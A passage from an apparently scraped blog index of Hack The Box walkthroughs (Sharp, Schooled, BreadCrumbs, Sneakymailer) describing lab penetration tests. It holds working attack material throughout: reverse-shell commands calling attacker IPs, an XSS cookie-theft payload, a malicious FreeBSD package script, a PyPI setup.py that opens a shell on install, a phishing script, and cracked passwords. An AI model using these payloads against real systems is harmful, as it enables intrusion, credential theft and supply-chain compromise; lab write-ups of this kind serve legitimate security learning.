net.webclient).downloadstring(&#39;http://10.10.x.x/Invoke-PowerShellTcp.ps1&#39;)&quot;));Now we need to tranfser the exe and the dll library to victim machine to get our reverse shellPS C:\\users\\lars\\documents&amp;gt; certutil -urlcache -split -f &quot;http://10.10.xx.x/WcfRemotingLibrary.dll&quot; WcfRemotingLibrary.dll**** Online **** 0000 ... 1e00CertUtil: -URLCache command completed successfully.PS C:\\users\\lars\\documents&amp;gt; certutil -urlcache -split -f &quot;http://10.10.xx.x/WcfClient.exe&quot; WcfClient.exe**** Online **** 0000 ... 1400CertUtil: -URLCache command completed successfully.PS C:\\users\\lars\\documents&amp;gt; dir Directory: C:\\users\\lars\\documentsMode LastWriteTime Length Name---- ------------- ------ ----d----- 11/15/2020 1:40 PM wcf-a---- 1/9/2021 6:51 PM 5120 WcfClient.exe-a---- 1/9/2021 6:50 PM 7680 WcfRemotingLibrary.dllRootExecute the WCFclient.exe to get the reverse shellPS C:\\users\\lars\\documents&amp;gt; .\\WcfClient.exeCheck your netcat now !D:\\SEALED\\Sharp&amp;gt;nc.exe -lvp 4322listening on [any] 4322 ...connect to [10.10.xx.xx] from DESKTOP-9LSPC40 [10.10.10.219] 49692Windows PowerShell running as user SHARP$ on SHARPCopyright (C) 2015 Microsoft Corporation. All rights reserved.PS C:\\Windows\\system32&amp;gt;whoamint authority\\systemPS C:\\Windows\\system32&amp;gt; cd /users/administrator/desktopPS C:\\users\\administrator\\desktop&amp;gt; dir Directory: C:\\users\\administrator\\desktopMode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 1/7/2021 2:17 PM 34 root.txt PS C:\\users\\administrator\\desktop&amp;gt; cat root.txtasda4as49d5as9d59as2d9as2dasdsThanks for reading i hope you enjoyed." }, { "title": "Hackthebox Schooled walkthrough", "url": "/posts/HackTheBox-Schooled-Walkthrough/", "categories": "HTB", "tags": "HTB", "date": "2021-11-26 01:34:00 +0000", "snippet": "Summary :1 - Stealing admin&#39;s cookie with XSS2 - Privilege escalation using a CVE3 - Getting RCE 4 - Database Enumeration5 - Password cracking6 - Creating malicious pkgScanning phase :Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0) | ssh-hostkey: | 2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA) | 256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA) |_ 256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519) 80/tcp open http Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15) |_http-favicon: Unknown favicon MD5: 460AF0375ECB7C08C3AE0B6E0B82D717 | http-methods: | Supported Methods: GET POST OPTIONS HEAD TRACE |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15 |_http-title: Schooled - A new kind of educational institute No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).We found two open ports (22 - 80).So what should we do here ?1 - Searching for an exploit for the running services.2 - Check the website and see what we can find.Enumeration : I start checking the application and nothing works, i only found a contact list.I saw admissions@schooled.htb i was suspicious so i tried to add it as a subdomain ‚Äúadmissions.schooled.htb‚Äù but it didn‚Äôt work.Now i will try see if there is another subdomain.ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://schooled.htb/ -H &#39;Host: FUZZ.schooled.htb&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.2.0-git ________________________________________________ :: Method : GET :: URL : http://schooled.htb/ :: Wordlist : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.schooled.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ moodle [Status: 200, Size: 84, Words: 5, Lines: 2] There is our subdomain !Now let‚Äôs check if we can create an account.Creating an account should be in that formula name@student.schooled.htbAfter some searching i found this CVE-2020-14321 that is the latest CVE for moodle so it should be for that box üòâSo if you read the CVE you should understood that i should have teacher role to use it.After a while i found that the only course i can enrol is math course.I read the announcements and i found this.So the teacher interact with the user through moodleNet profile.The first thing came into my head that i should use xss to steal his cookie, let‚Äôs try it.Payload : &amp;lt;img src=x onerror=this.src=‚Äôhttp://10.10.x.x:8000/?‚Äô+document.cookie;&amp;gt;Now we are manuel Phillips.The next thing is enrolling a user, intercept the request, change the role to 1, and ID to our ID. This process will allow us to log in as the user we add. You must pick a user that has a manager role, which in our case is Lianne Carter.Let‚Äôs do it !Now look at the left panel.We have site administration now.To get our RCE we have to install a custom plugin but we should edit our role to be able to install plugin.Go to Users &amp;gt; Define Roles &amp;gt; Manager &amp;gt; Edit to edit our role, intercept the request and change it with the one on github.Now we can install plugin.Just follow Moodle Rce and trigger the rce at ‚Äúdomain/blocks/rce/lang/en/block_rce.php?cmd=id‚ÄùFoothold : We got our shell !!After some enumeration i found database configuration file.When i tried to use mysql the OS didn‚Äôt find it, so i looked for it in /usr/local/bin and i found it, let‚Äôs get the creds !Now let‚Äôs crack the hash.User Flag : Jamies password = !QAZ2wsxLet‚Äôs grab our SSH.Privilege escalation :After using sudo -l, we can install pkg with nopasswd.I found this refernce to create a pkg http://lastsummer.de/creating-custom-packages-on-freebsd/Script for getting root : #!/bin/sh STAGEDIR=/tmp/package rm -rf ${STAGEDIR} mkdir -p ${STAGEDIR} cat &amp;gt;&amp;gt; ${STAGEDIR}/+PRE_INSTALL &amp;lt;&amp;lt;EOF echo ‚ÄúResetting root shell‚Äù rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.x.x 9080 &amp;gt;/tmp/a EOF cat &amp;gt;&amp;gt; ${STAGEDIR}/+POST_INSTALL &amp;lt;&amp;lt;EOF echo ‚ÄúRegistering root shell‚Äù pw usermod -n root -s /bin/sh EOF cat &amp;gt;&amp;gt; ${STAGEDIR}/+MANIFEST &amp;lt;&amp;lt;EOF name: mypackage version: ‚Äú1.0_5‚Äù origin: sysutils/mypackage comment: ‚Äúautomates stuff‚Äù desc: ‚Äúautomates tasks which can also be undone later‚Äù maintainer: john@doe.it www: https://doe.it prefix: / EOF pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -o . This script will create .txz file.Root flag : 1 - Setup a listner on your machine 2 - use this command ‚Äúsudo pkg install ‚Äìno-repo-update *.txz‚Äù" }, { "title": "Hackthebox BreadCrumbs walkthrough", "url": "/posts/HackTheBox-BreadCrumbs-Walkthrough/", "categories": "HTB", "tags": "HTB", "date": "2021-11-26 01:32:00 +0000", "snippet": "Methodology Enumeration by LFI Phpsessid and Jwt token forge unrestricted upload Database leak Binary file analysis Port forwarding Database dump with SQLMAP‚îå‚îÄ‚îÄ(rootüíÄm19o)-[~/HTB/Breadcrumbs]‚îî‚îÄ# nmap -sV -v -p- --min-rate=10000 10.10.10.228PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)445/tcp open microsoft-ds?3306/tcp open mysql?5040/tcp open unknown7680/tcp open pando-pub?49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.91%I=7%D=2/23%Time=6034FA27%P=x86_64-pc-linux-gnu%r(RPSF:CCheck,4A,&quot;F\\0\\0\\x01\\xffj\\x04Host\\x20&#39;10\\.10\\.14\\.12&#39;\\x20is\\x20not\\x20aSF:llowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(X11ProbeSF:,4A,&quot;F\\0\\0\\x01\\xffj\\x04Host\\x20&#39;10\\.10\\.14\\.12&#39;\\x20is\\x20not\\x20allowedSF:\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;);Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsEnumerationAs a penetartion tester you should analyze the application to understand the functionality of itSo now let`s check what that button does.From that page we can understand that the application is for reading books and that button checks for books with title and author nameLet`s see how does the application search for booksSo i started to test the searching with random word, in my case i used test to understand the behaviorI got nothing from that, so i will start my proxy &quot;Burpsuite&quot; to intercept that requestAfter intercepting the request as you can see there is another parameter called &quot;method&quot; we couldn`t see before, now let`s change method value to 1I managed to generate an error by changing the method value to 1The first line error says there is a missing key in the array called book and the second line error says that file_get_content method can`t find the file, so what if we gave it a file to open ?So now we got LFI , Files.php says that we need to get paul session to loginLet`s see how this application generates a cookieSo now we got the code that generates the cookie, let`s get paul`s cookie$username=&quot;paul&quot;;$max =3;$seed = rand(0, $max);foreach (range(0, $max) as $seed) {$key = &quot;s4lTy_stR1nG_&quot;.$username[$seed].&quot;(!528./9890&quot;;$session_cookie = $username.md5($key);}echo $session_cookie;&amp;gt;paul47200b180ccd6835d25d034eeb6e6390Now we got our cookieLet`s change it and loginNow we got accessLet`s check all the tabs and see what we can getSo i can upload now ! , Let`s check how it worksIt says there is a key called token is missing, i need to generate a token , let`s see how we can have one.As you can see login.php uses authController.php to validate , now let`s see authcontroller.php content.Now i can generate our tokenTo generate a token we need payload and secret key as mentioned , out payload load is a Multidimensional Array , { &quot;data&quot; { &quot;username&quot; : &quot;paul&quot; } }$secret_key = &#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#39;;&amp;lt; Token= eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCULet`s upload the backdoorIt accepts ZIP files only, so upload a zip file and change it`s content with PHP backdoor and change the tipe to PHP in the filename and in the end of the request tooFootholdLet`s start enumeration from inside, Upload dir is &quot;Portal/Uploads&quot; you will find your backdoor thereThere is an interesting fold name pizzaDeliveryUserData, let`s check it.That`s juicy, All users data but it looks like that only one user is enabled, that user is juliette, let`s check that file.Got creds now !!User FlagLet`s continue enumerationMicrosoft stickynote contains juciy info, let`s check itDatabase files we need to open it on our machine to check itYou can download the files with more than way, use what you likeIn my case i used SCP to get the filesUsage : scp &quot;file you want to download&quot; user@0.0.0.0:path &quot;Your ip and where you want to download it&quot;Lateral MovmentAfter downloading the files look What i got !juliette: jUli901./())!development: fN3)sN5Ee@gadministrator: [MOVED]Laterl Movment DONEPrivilege EscalationWhat Development user have for?I tried type ./Krypter_linux and that what it gave meThat`s looks like a SQL statement, we need SQLMAP NOW !!PS C:\\Development&amp;gt; curl &#39;http://127.0.0.1:1234/index.php?method=select&amp;amp;username=administrator&amp;amp;table=passwords&#39; -UseBasicParsingStatusCode : 200 StatusDescription : OK Content : selectarray(1) { [0]=&amp;gt; array(1) { [&quot;aes_key&quot;]=&amp;gt; string(16) &quot;k19D193j.&amp;lt;19391(&quot; } } RawContent : HTTP/1.1 200 OK Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Length: 96 Content-Type: text/html; charset=UTF-8 Date: Tue, 23 Feb 2021 19:24:09 GMT Server: Apache/2.4.46 (Win64) ... Forms : Headers : {[Keep-Alive, timeout=5, max=100], [Connection, Keep-Alive], [Content-Length, 96], [Content-Type, text/html; charset=UTF-8]...} Images : {} InputFields : {} Links : {} ParsedHtml : RawContentLength : 96 To use SQLMAP we need to use port forwardingIn my case i used SSHssh -N -L 1234:127.0.0.1:1234 development@10.10.10.228‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/HTB/Breadcrumbs]‚îî‚îÄ# curl &#39;http://127.0.0.1:1234/index.php?method=select&amp;amp;username=administrator&amp;amp;table=passwords&#39;selectarray(1) { [0]=&amp;gt; array(1) { [&quot;aes_key&quot;]=&amp;gt; string(16) &quot;k19D193j.&amp;lt;19391(&quot; }}Let`s ROLLsqlmap -u http://127.0.0.1:1234/index.php\\?method\\=select\\&amp;amp;username\\=administrator\\&amp;amp;table\\=passwords --dumpDatabase: breadTable: passwords[1 entry]+----+---------------+------------------+----------------------------------------------+| id | account | aes_key | password |+----+---------------+------------------+----------------------------------------------+| 1 | Administrator | k19D193j.&amp;lt;19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= |+----+---------------+------------------+----------------------------------------------+Now we need to decrypt the passwordSo we need to use base64 decode and after that we need to use aes decrypt with the key we gotYou can use this link to decrypt ithttps://gchq.github.io/CyberChef/#recipe=From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,false)AES_Decrypt(%7B&#39;option&#39;:&#39;Latin1&#39;,&#39;string&#39;:&#39;k19D193j.%3C19391(&#39;%7D,%7B&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;0000000000000000000000000000000&#39;%7D,&#39;CBC&#39;,&#39;Raw&#39;,&#39;Raw&#39;,%7B&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;&#39;%7D,%7B&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;undefined&#39;%7D)&amp;amp;input=SDJkRnovak53dFNUV0RVUm90OUpCaFdNUDZYT2RtY3BncXZZSEczNVFLdz0ROOT Flag" }, { "title": "Hackthebox Sneakymailer walkthrough", "url": "/posts/Hackthebox-Sneakymailer-Walkthrough/", "categories": "HTB", "tags": "HTB", "date": "2021-11-26 01:31:00 +0000", "snippet": "ReconNMAProott@kali:~$ sudo nmap 10.10.10.197 -sV -sC -p- -A Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-27 05:55 ESTStats: 0:17:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 98.61% done; ETC: 06:12 (0:00:00 remaining)Nmap scan report for sneakycorp.htb (10.10.10.197)Host is up (0.98s latency).Not shown: 65528 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)| 256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)|_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)25/tcp open smtp Postfix smtpd|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, | ssl-cert: Subject: commonName=debian| Subject Alternative Name: DNS:debian| Not valid before: 2020-05-14T17:12:20|_Not valid after: 2030-05-12T17:12:20|_ssl-date: TLS randomness does not represent time80/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: Employee - Dashboard143/tcp open imap Courier Imapd (released 2018)|_imap-capabilities: STARTTLS THREAD=ORDEREDSUBJECT THREAD=REFERENCES QUOTA ACL CAPABILITY completed UTF8=ACCEPTA0001 IMAP4rev1 SORT ACL2=UNION NAMESPACE ENABLE CHILDREN UIDPLUS IDLE OK| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example.com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time993/tcp open ssl/imaps?|_imap-capabilities: THREAD=ORDEREDSUBJECT THREAD=REFERENCES QUOTA ACL CAPABILITY completed UTF8=ACCEPTA0001 IMAP4rev1 AUTH=PLAIN SORT ACL2=UNION NAMESPACE ENABLE CHILDREN UIDPLUS IDLE OK| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example.com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time8080/tcp open http nginx 1.14.2|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: nginx/1.14.2|_http-title: Welcome to nginx!No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.80%E=4%D=11/27%OT=21%CT=1%CU=40029%PV=Y%DS=2%DC=T%G=Y%TM=5FC0DFOS:4C%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=C)OPOS:S(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BSTOS:11NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECOS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=NOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%COS:D=S)Network Distance: 2 hopsService Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 1025/tcp)HOP RTT ADDRESS1 219.86 ms 10.10.16.12 136.11 ms sneakycorp.htb (10.10.10.197)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 1080.13 secThat`s a big scan result.At the end of the scan you can see the domain so we need to add it. add sneakycorp.htb to /etc/hosts file Port 80 Let`s see what we can find.It`s a pypi serverLet`s check team and see what we can find All e-mails of employees including ceo Now we need to extract e-mails for the webpage, I used online email extractor tool. https://email-checker.net/extractcrtl+a to select all and copy them. Paste them and click on extract emailResult Now save it all in a fill name it emailsPhishing We need to sned spoofed emails to check what we can get, I used swakshttps://github.com/jetmore/swaks‚ûú sneakymailer swaks --from &quot;angelicaramos@sneakymailer.htb&quot; --body &quot;Test msg&quot; --to angelicaramos@sneakymailer.htb=== Trying sneakymailer.htb:25...=== Connected to sneakymailer.htb.&amp;lt;- 220 debian ESMTP Postfix (Debian/GNU) -&amp;gt; EHLO m19o&amp;lt;- 250-debian&amp;lt;- 250-PIPELINING&amp;lt;- 250-SIZE 10240000&amp;lt;- 250-VRFY&amp;lt;- 250-ETRN&amp;lt;- 250-STARTTLS&amp;lt;- 250-ENHANCEDSTATUSCODES&amp;lt;- 250-8BITMIME&amp;lt;- 250-DSN&amp;lt;- 250-SMTPUTF8&amp;lt;- 250 CHUNKING -&amp;gt; MAIL FROM:&amp;lt;angelicaramos@sneakymailer.htb&amp;gt;&amp;lt;- 250 2.1.0 Ok -&amp;gt; RCPT TO:&amp;lt;angelicaramos@sneakymailer.htb&amp;gt;&amp;lt;- 250 2.1.5 Ok -&amp;gt; DATA&amp;lt;- 354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt; -&amp;gt; Date: Wed, 15 Jul 2020 22:56:30 -0400 -&amp;gt; To: angelicaramos@sneakymailer.htb -&amp;gt; From: angelicaramos@sneakymailer.htb -&amp;gt; Subject: test Wed, 15 Jul 2020 22:56:30 -0400 -&amp;gt; Message-Id: &amp;lt;20200715225630.013546@m19o&amp;gt; -&amp;gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/ -&amp;gt; -&amp;gt; Test msg -&amp;gt; -&amp;gt; -&amp;gt; .&amp;lt;- 250 2.0.0 Ok: queued as F3049248C8 -&amp;gt; QUIT&amp;lt;- 221 2.0.0 Bye=== Connection closed with remote host.Phishing scriptimport osdef open_ressources(file_path): return [item.replace(&quot;\\n&quot;, &quot;&quot;) for item in open(file_path).readlines()]wordlist = open_ressources(&quot;emails&quot;)for emails in wordlist: print &quot;\\n[+]Sending email to &quot; + emails command = &#39;swaks --from &quot;angelicaramos@sneakymailer.htb&quot; --body &quot;http://10.10.14.24:8080&quot; --to &#39; + emails + &quot; &amp;gt; /dev/null&quot; #print command os.system(command)Result after running the script‚ûú sneakymailer python spoof-msg.py [+]Sending email to airisatou@sneakymailer.htb[+]Sending email to angelicaramos@sneakymailer.htb[+]Sending email to ashtoncox@sneakymailer.htb[+]Sending email to bradleygreer@sneakymailer.htbThe response on listener‚ûú m19o nc -nlvp 8080 Ncat: Version 7.80 ( https://nmap.org/ncat )Ncat: Listening on :::8080Ncat: Listening on 0.0.0.0:8080Ncat: Connection from 10.10.10.197.Ncat: Connection from 10.10.10.197:48426.POST / HTTP/1.1Host: 10.10.14.24:8080User-Agent: python-requests/2.23.0Accept-Encoding: gzip, deflateAccept: */*Connection: keep-aliveContent-Length: 185Content-Type: application/x-www-form-urlencodedfirstName=Paul&amp;amp;lastName=Byrd&amp;amp;email=paulbyrd%40sneakymailer.htb&amp;amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHtSo we found user : paulbyrd and the password we need to decode itResult after decodingfirstName=Paul&amp;amp;lastName=Byrd&amp;amp;email=paulbyrd@sneakymailer.htb&amp;amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:Ht&amp;amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:HtSo we Gotmail: paulbyrd@sneakymailer.htbuser: paulbyrdpassword: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&amp;lt;:HtNow i need to install evolution and enter the creds for smpt server 10.10.10.197 and the mail we found mail 1 :Âèë‰ª∂‰∫∫: Paul Byrd paulbyrd@sneakymailer.htbÊî∂‰ª∂‰∫∫: low@debian‰∏ªÈ¢ò: Module testingÊó•Êúü: Wed, 27 May 2020 13:28:58 -0400Hello lowYour current task is to install, test and then erase every python module youfind in our PyPI service, let me know if you have any inconvenience.mail 2 :Âèë‰ª∂‰∫∫: Paul Byrd paulbyrd@sneakymailer.htbÊî∂‰ª∂‰∫∫: root root@debian‰∏ªÈ¢ò: Password resetÊó•Êúü: Fri, 15 May 2020 13:03:37 -0500 (2020Âπ¥05Êúà15Êó• 14Êó∂03ÂàÜ37Áßí)Hello administrator, I want to change this password for the developer accountUsername: developerOriginal-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]CPlease notify me when you do itFTP login‚ûú m19o ftp sneakymailer.htbConnected to sneakymailer.htb.220 (vsFTPd 3.0.3)Name (sneakymailer.htb:prashant): developer331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt;devftp&amp;gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxrwxr-x 8 0 1001 4096 Jul 15 22:30 dev226 Directory send OK.ftp&amp;gt;ftp&amp;gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x 2 0 0 4096 May 26 19:52 cssdrwxr-xr-x 2 0 0 4096 May 26 19:52 img-rwxr-xr-x 1 0 0 13742 Jun 23 09:44 index.phpdrwxr-xr-x 3 0 0 4096 May 26 19:52 jsdrwxr-xr-x 2 0 0 4096 May 26 19:52 pypidrwxr-xr-x 4 0 0 4096 May 26 19:52 scss-rwxr-xr-x 1 0 0 26523 May 26 20:58 team.phpdrwxr-xr-x 8 0 0 4096 May 26 19:52 vendor226 Directory send OK.ftp&amp;gt;let`s try to upload reverse shell and execute it ftp&amp;gt; put shell.phplocal: shell.php remote: shell.php200 PORT command successful. Consider using PASV.150 Ok to send data.226 Transfer complete.5492 bytes sent in 0.00 secs (59.5179 MB/s)i tried to execute it at http://sneakycorp.htb/shell.php but did work so i checked if dev is subdomainLol, it is a subdomain that was easy. You can use a lot of tools to get subdomain and you can be lucky üòÇlet`s upload the shell and execute it from http://dev.sneakycorp.htb/shell.php Shell‚ûú m19o rlwrap nc -nlvp 1234 Ncat: Version 7.80 ( https://nmap.org/ncat )Ncat: Listening on :::1234Ncat: Listening on 0.0.0.0:1234Ncat: Connection from 10.10.10.197.Ncat: Connection from 10.10.10.197:41628.Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux 00:10:18 up 26 min, 0 users, load average: 0.04, 0.10, 0.09USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)bash: cannot set terminal process group (715): Inappropriate ioctl for devicebash: no job control in this shellwww-data@sneakymailer:/$It worked and we got in as www-datalet`s us SU to switch to developer user we found www-data@sneakymailer:/$ su developersu developerPassword: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]Cdeveloper@sneakymailer:/$i found 2 usersdeveloper@sneakymailer:/home$ lslslow vmailCan`t get the user hash so let`s try to enumerate by Linenum.sh/p&amp;gt;&amp;lt;/blockquote&amp;gt;developer@sneakymailer:/tmp$ curl http://10.10.14.24:8080/LinEnum.sh | bash curl http://10.10.14.24:8080/LinEnum.sh | bash % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 46476 57 26729 0 0 12519 0 0:00:03 0:00:02 0:00:01 12525476 100 46476 0 0 18908 0 0:00:02 0:00:02 --:--:-- 18908 ######################################################### # Local Linux Enumeration &amp;amp; Privilege Escalation Script # ######################################################### # www.rebootuser.com # version 0.981 [-] Debug Info [+] Thorough tests = Disabled we found password at .htpasswd [-] htpasswd found - could contain passwords: /var/www/pypi.sneakycorp.htb/.htpasswd pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/ Let`s crack it‚ûú m19o john hash -w=/usr/share/wordlists/rockyou.txtWarning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])Will run 5 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statussoufianeelhaoui (pypi)1g 0:00:00:12 DONE (2020-07-16 00:43) 0.07757g/s 277312p/s 277312c/s 277312C/s souheib2..sottodUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed Remember the mail we got for low userHello lowYour current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience. Building the packagehttps://pypi.org/project/pypiserver/#upload-with-setuptoolshttps://packaging.python.org/tutorials/packaging-projects/https://packaging.python.org/guides/distributing-packages-using-setuptools/ i have to make two files .pypircsetup.py The file .pypircwill give me authority and setup.py will be contain the package .pypirc[distutils]index-servers = local[local]repository: http://pypi.sneakycorp.htb:8080username: pypipassword: soufianeelhaoui setup.pywill contain the reverse shell import setuptoolsimport osif os.getuid() == 1000: os.system(&#39;nc -e /bin/bash 10.10.17.16 2345&#39;)setuptools.setup( name=&#39;sample&#39;, version=&#39;1.2.0&#39;, description=&#39;A sample Python project&#39;, long_description=&quot;long_description&quot;, long_description_content_type=&#39;text/x-rst&#39;, url=&#39;https://github.com/pypa/sampleproject&#39;, author=&#39;A. Random Developer&#39;, author_email=&#39;author@example.com&#39;, license=&#39;MIT&#39;, packages=setuptools.find_packages(), install_requires=[&#39;peppercorn&#39;],) id : 1000 belongs to user &quot;Low&quot; , the file will be executed twiceDeveloper will run itLow will run it too to test it So i want the shell as &quot;low&quot;,let`s nc and upload the files to execute it developer@sneakymailer:/tmp$ wget -r --no-parent http://10.10.17.16:8080/pypi-pkg &amp;lt;get -r --no-parent http://10.10.17.16:8080/pypi-pkg --2020-07-16 01:06:23-- http://10.10.17.16:8080/pypi-pkg Connecting to 10.10.17.16:8080... connected.HTTP request sent, awaiting response... 301 Moved PermanentlyLocation: /pypi-pkg/ [following]--2020-07-16 01:06:24-- http://10.10.17.16:8080/pypi-pkg/Connecting to 10.10.17.16:8080... connected.HTTP request sent, awaiting response... 200 OKLength: 294 [text/html]Saving to: ‚Äò10.10.17.16:8080/pypi-pkg‚Äô10.10.14.24:8080/py 100%[===================&amp;gt;] 294 --.-KB/s in 0s 2020-07-16 01:06:25 (23.1 MB/s) - ‚Äò10.10.17.16:8080/pypi-pkg‚Äô saved [294/294]--2020-07-16 01:06:26-- http://10.10.17.16:8080/pypi-pkg/.pypircConnecting to 10.10.17.16:8080... connected.HTTP request sent, awaiting response... 200 OKLength: 128 [application/octet-stream]Saving to: 